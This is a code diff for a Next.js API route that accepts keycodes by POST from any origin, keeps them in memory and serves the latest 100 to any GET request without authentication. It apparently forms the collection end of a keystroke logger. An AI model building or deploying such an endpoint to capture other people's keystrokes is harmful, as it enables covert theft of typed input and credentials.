@@ -1,23 +1,31 @@
+// pages/api/data.js
+
+let logs = []; // Keep logs in memory across requests
+
 export default async function handler(req, res) {
-  // Allow all origins (for development only)
+  // Allow all origins (for development)
   res.setHeader("Access-Control-Allow-Origin", "*");
-  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
+  res.setHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
   res.setHeader("Access-Control-Allow-Headers", "Content-Type");
 
-  let logs = [];
+  if (req.method === "OPTIONS") {
+    return res.status(200).end(); // Respond to preflight
+  }
 
-export default function handler(req, res) {
-  if (req.method === 'POST') {
+  if (req.method === "POST") {
     const { keycode } = req.body;
-    if (keycode !== undefined) logs.push(keycode);
-    return res.status(200).json({ success: true });
+    if (typeof keycode === "number") {
+      logs.push(keycode);
+      return res.status(200).json({ success: true });
+    } else {
+      return res.status(400).json({ error: "Invalid keycode" });
+    }
   }
 
-  if (req.method === 'GET') {
-    return res.status(200).json(logs.slice(-100));
+  if (req.method === "GET") {
+    return res.status(200).json(logs.slice(-100)); // Return recent logs
   }
 
-  res.status(405).json({ error: "Method not allowed" });
-}
-
+  res.setHeader("Allow", ["GET", "POST", "OPTIONS"]);
+  res.status(405).end(`Method ${req.method} Not Allowed`);
 }
